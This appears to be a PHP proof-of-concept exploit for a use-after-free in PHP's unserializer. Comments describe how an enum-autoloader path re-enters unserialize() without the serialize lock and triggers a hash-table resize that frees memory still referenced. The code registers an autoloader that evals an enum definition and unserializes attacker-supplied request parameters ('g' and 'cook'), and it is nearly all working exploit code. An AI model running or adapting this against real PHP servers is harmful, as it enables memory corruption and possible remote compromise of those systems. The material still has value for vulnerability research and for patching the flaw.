<?php
// E:-branch door: no Serializable gadget class shipped. The var_unserializer
// E: rule runs the autoloader without BG(serialize_lock); the autoloader's
// unserialize() then shares the outer var_hash. ->x = 0 on an 8-prop inner
// stdClass triggers the nTableSize 8->16 resize that frees the arData the
// outer var_hash still indexes.
error_reporting(0);
spl_autoload_register(function ($class) {
    eval("enum $class { case On; }");
    unserialize($_REQUEST['g'])->x = 0;
});
echo serialize(@unserialize($_REQUEST['cook']));
